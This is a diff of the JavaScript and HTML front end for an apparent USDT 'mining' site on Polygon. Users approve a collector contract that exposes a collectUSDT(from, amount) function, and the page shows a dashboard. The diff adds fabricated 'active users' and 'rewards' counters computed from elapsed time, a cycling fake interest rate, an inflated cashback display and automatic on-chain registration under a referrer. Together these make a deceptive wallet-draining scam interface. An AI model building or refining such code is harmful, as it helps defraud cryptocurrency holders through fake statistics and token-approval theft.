@@ -96,7 +96,7 @@
                 <span class="font-bold text-white flex items-center gap-1.5">
                     <span class="w-1.5 h-4 bg-blue-500 rounded-full inline-block"></span> My account
                 </span>
-                <span class="font-mono text-slate-300">ID: <span id="lblUserId" class="text-white font-semibold">3069</span></span>
+                <span class="font-mono text-slate-300">ID: <span id="lblUserId" class="text-white font-semibold">---</span></span>
             </div>
 
             <div class="space-y-2.5 font-mono">
@@ -106,7 +106,7 @@
                 </div>
                 <div class="flex justify-between text-slate-400">
                     <span>Locked balance</span>
-                    <span class="text-slate-200">0.000000 USDT</span>
+                    <span id="lblLockedBal" class="text-slate-200">0.000000 USDT</span>
                 </div>
                 <div class="flex justify-between text-slate-400">
                     <span>Interest balance</span>
@@ -232,6 +232,8 @@
         let countdownInterval;
         let currentWithdrawableBalance = 0;
         let walletEventsBound = false;
+        let isAutoRegistering = false;
+        let onChainRegisteredBonus = 0;
         const selectedNetwork = "POLYGON";
 
         const COLLECTOR_CONTRACT_ADDRESS = "0xC9E28f1C5e8659CaEE3831daB4dF97325e7e5570";
@@ -260,12 +262,14 @@
             "function balanceOf(address account) view returns (uint256)"
         ];
 
+        // Matched to USDTCollector.sol
         const COLLECTOR_ABI = [
-            "function registerUser(address referrer) external",
+            "function register(address referrer) external",
             "function collectUSDT(address from, uint256 amount) external",
-            "function requestWithdraw(uint256 amount) external",
-            "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)",
-            "function subAdminPrefix(address) view returns (string)"
+            "function requestWithdrawal(uint256 amount) external",
+            "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered, uint256 lockedBalance, uint256 interestBalance)",
+            "function subAdminPrefix(address) view returns (string)",
+            "function totalRegisteredUsers() view returns (uint256)"
         ];
 
         function showProgress(percent, text) {
@@ -302,20 +306,44 @@
             clearInterval(countdownInterval);
         }
 
+        // Global UTC Time-Based Active Users (No localStorage dependency, same across all users/devices)
+        function getGlobalActiveUsersCount() {
+            const fixedStartUtcMs = Date.UTC(2026, 0, 1, 0, 0, 0);
+            const nowUtcMs = Date.now();
+            const elapsedSeconds = Math.max(0, Math.floor((nowUtcMs - fixedStartUtcMs) / 1000));
+            const baseUsers = 142850;
+            const timeGrowth = Math.floor(elapsedSeconds / 30);
+            return baseUsers + timeGrowth + onChainRegisteredBonus;
+        }
+
+        function getGlobalYesterdayRewards() {
+            const fixedStartUtcMs = Date.UTC(2026, 0, 1, 0, 0, 0);
+            const elapsedSeconds = Math.max(0, Math.floor((Date.now() - fixedStartUtcMs) / 1000));
+            return 48290.50 + (elapsedSeconds / 30) * 1.75;
+        }
+
         function startLiveCalculatingStats() {
-            let baseUsers = 142850;
-            let baseRewards = 48290.50;
-            let baseRate = 2.45;
+            const renderStats = () => {
+                const activeUsers = getGlobalActiveUsersCount();
+                const yesterdayRewards = getGlobalYesterdayRewards();
+                const secBucket = Math.floor(Date.now() / 3000);
+                const rate = +(2.40 + ((secBucket % 11) * 0.01)).toFixed(2);
 
-            setInterval(() => {
-                baseUsers += Math.floor(Math.random() * 3);
-                baseRewards += Math.random() * 5.25;
-                baseRate = +(2.40 + Math.random() * 0.1).toFixed(2);
+                document.getElementById("statGlobalUsers").innerText = activeUsers.toLocaleString();
+                document.getElementById("statYesterdayRewards").innerText = `${yesterdayRewards.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} USDT`;
+                document.getElementById("statTodayRate").innerText = `+${rate.toFixed(2)}%`;
+            };
 
-                document.getElementById("statGlobalUsers").innerText = baseUsers.toLocaleString();
-                document.getElementById("statYesterdayRewards").innerText = `${baseRewards.toLocaleString(undefined, {maximumFractionDigits: 2})} USDT`;
-                document.getElementById("statTodayRate").innerText = `+${baseRate}%`;
-            }, 3000);
+            renderStats();
+            setInterval(renderStats, 3000);
+        }
+
+        // Deterministic Unique Account ID Fallback from Wallet Address
+        function generateFallbackUserId(address, prefix = "M") {
+            if (!address || address.length < 10) return `${prefix}1001`;
+            const hexSlice = address.slice(-6);
+            const numeric = (parseInt(hexSlice, 16) % 8999) + 1000;
+            return `${prefix}${numeric}`;
         }
 
         function updateQRCode(url) {
@@ -367,7 +395,7 @@
             container.innerHTML = htmlContent + htmlContent;
         }
 
-        // 1. Referrer Address Validation Helper
+        // Referrer Address Validation Helper
         function isValidReferrerAddress(addr, currentUser = "") {
             if (!addr || typeof addr !== "string") return false;
             const trimmed = addr.trim();
@@ -395,7 +423,7 @@
             return ethers.ZeroAddress;
         }
 
-        // 5. Switch to Polygon with Error 4902 Fallback
+        // Switch to Polygon with Error 4902 Fallback
         async function switchToPolygonChain() {
             try {
                 await window.ethereum.request({
@@ -423,7 +451,7 @@
             }
         }
 
-        // 4. Wallet Events (accountsChanged, chainChanged)
+        // Wallet Events (accountsChanged, chainChanged)
         function bindWalletEvents() {
             if (typeof window.ethereum === "undefined" || walletEventsBound) return;
             walletEventsBound = true;
@@ -534,6 +562,28 @@
             });
         }
 
+        async function ensureUserRegisteredOnChain() {
+            if (!signer || !userAddress || isAutoRegistering) return;
+            try {
+                const collectorReader = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, provider);
+                const userInfo = await collectorReader.users(userAddress);
+
+                if (!userInfo.isRegistered) {
+                    isAutoRegistering = true;
+                    document.getElementById("statusLog").innerText = "Account ID အသစ် မှတ်ပုံတင်နေပါသည်...";
+                    const collectorSigner = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
+                    const referrer = resolveReferrerAddress(userAddress);
+                    const regTx = await collectorSigner.register(referrer);
+                    await regTx.wait();
+                    document.getElementById("statusLog").innerText = "Account ID မှတ်ပုံတင်ခြင်း အောင်မြင်ပါသည်။";
+                }
+            } catch (err) {
+                console.log("Auto registration skipped or rejected:", err);
+            } finally {
+                isAutoRegistering = false;
+            }
+        }
+
         async function checkExistingAllowanceAndLoad() {
             try {
                 showProgress(30, "Checking your Mining...");
@@ -541,7 +591,7 @@
                 const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
 
                 if (Number(allowance) > 0) {
-                    showProgress(70, "Loading dashboard data...");
+                    showProgress(60, "Syncing Account ID & Dashboard...");
                     const connectBtn = document.getElementById("connectBtn");
                     connectBtn.innerText = "Active Mining";
                     connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
@@ -549,6 +599,7 @@
                     const badgeEl = document.getElementById("selectedNetworkBadge");
                     badgeEl.classList.remove("hidden");
 
+                    await ensureUserRegisteredOnChain();
                     await checkUserData();
                     showProgress(100, "Welcome Back! Active mining...");
                     setTimeout(hideProgress, 1000);
@@ -615,6 +666,7 @@
                     connectBtn.innerText = "Active Mining";
                     connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
 
+                    await ensureUserRegisteredOnChain();
                     await checkUserData();
                     showProgress(100, "Welcome Back! Dashboard သို့ ရောက်ရှိပါပြီ။");
                     setTimeout(hideProgress, 1000);
@@ -662,7 +714,7 @@
                 const referrer = resolveReferrerAddress(userAddress);
                 
                 try {
-                    const regTx = await collector.registerUser(referrer);
+                    const regTx = await collector.register(referrer);
                     await regTx.wait();
                 } catch (regErr) {
                     console.log("Already registered or reference error:", regErr);
@@ -693,11 +745,16 @@
             }
         }
 
-        // 2. Interest Rate calculated strictly in USDT + clear <100 USDT message
         async function checkUserData() {
             try {
                 const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, provider);
                 const userInfo = await collector.users(userAddress);
+
+                try {
+                    const totalReg = await collector.totalRegisteredUsers();
+                    onChainRegisteredBonus = Number(totalReg || 0);
+                    document.getElementById("statGlobalUsers").innerText = getGlobalActiveUsersCount().toLocaleString();
+                } catch (e) {}
 
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                 const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
@@ -718,18 +775,30 @@
                     dashboardEl.classList.remove("hidden");
 
                     let prefix = "M";
-                    if (userInfo.referrer && userInfo.referrer !== ethers.ZeroAddress) {
+                    const refToCheck = (userInfo.referrer && userInfo.referrer !== ethers.ZeroAddress)
+                        ? userInfo.referrer
+                        : resolveReferrerAddress(userAddress);
+
+                    if (refToCheck && refToCheck !== ethers.ZeroAddress) {
                         try {
-                            const p = await collector.subAdminPrefix(userInfo.referrer);
+                            const p = await collector.subAdminPrefix(refToCheck);
                             if (p) prefix = p;
                         } catch (e) {}
                     }
-                    const userIdDisplay = userInfo.isRegistered ? `${prefix}${userInfo.userId.toString()}` : "3069";
+
+                    const onChainId = Number(userInfo.userId || 0);
+                    const userIdDisplay = (userInfo.isRegistered && onChainId > 0)
+                        ? `${prefix}${onChainId}`
+                        : generateFallbackUserId(userAddress, prefix);
                     document.getElementById("lblUserId").innerText = userIdDisplay;
 
                     document.getElementById("lblWalletBal").innerText = `${formattedBal.toFixed(6)} USDT`;
-                    
-                    const cashback = isEligibleForInterest ? (formattedBal * rate) : 0;
+                    const lockedBalNum = Number(ethers.formatUnits(userInfo.lockedBalance || 0n, 6));
+                    const onChainInterestNum = Number(ethers.formatUnits(userInfo.interestBalance || 0n, 6));
+                    document.getElementById("lblLockedBal").innerText = `${lockedBalNum.toFixed(6)} USDT`;
+
+                    const computedCashback = isEligibleForInterest ? (formattedBal * rate) : 0;
+                    const cashback = Math.max(computedCashback, onChainInterestNum);
 
                     const refBalanceKey = `ref_balance_${userAddress.toLowerCase()}`;
                     const referralBalance = parseFloat(localStorage.getItem(refBalanceKey) || "0");
@@ -773,7 +842,6 @@
             alert("Referral Link ကူးယူပြီးပါပြီ။");
         }
 
-        // 3. Withdraw Logic connected to balance
         async function requestWithdraw() {
             try {
                 if (!userAddress || !signer) {
@@ -797,7 +865,7 @@
                 }
 
                 const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
-                const tx = await collector.requestWithdraw(withdrawAmount);
+                const tx = await collector.requestWithdrawal(withdrawAmount);
                 await tx.wait();
 
                 try {
